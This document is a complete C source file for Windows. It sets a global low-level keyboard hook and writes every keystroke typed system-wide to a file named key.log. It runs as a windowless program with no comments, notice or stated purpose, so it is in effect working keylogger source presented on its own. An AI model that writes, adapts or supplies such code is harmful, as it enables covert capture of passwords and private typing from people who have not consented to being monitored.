#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <stdbool.h>
#include <winbase.h>
#include <share.h>

HHOOK hookHandle;
FILE* fp;

LRESULT CALLBACK LogKey(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	KBDLLHOOKSTRUCT kbdStruct;
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			wchar_t keyText[1024];
			DWORD code = kbdStruct.scanCode << 16;

			int result = GetKeyNameText(code, keyText, sizeof(keyText) / sizeof(wchar_t));
			if (result > 0) {
				size_t keyTextLen = wcslen(keyText);
				if (keyTextLen == 1) {
					fprintf(fp, "%ls", keyText);
				}
				else {
					fprintf(fp, "[%ls]", keyText);
				}
				fflush(fp);
			}
		}
	}
	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
};

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
	fp = _fsopen("key.log", "w", _SH_DENYNO);
	if (!fp) {
		return 1;
	}

	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &LogKey, NULL, 0);
	
	MSG msg;
	while (1) {
		GetMessage(&msg, NULL, 0, 0);
	};

	return 0;
}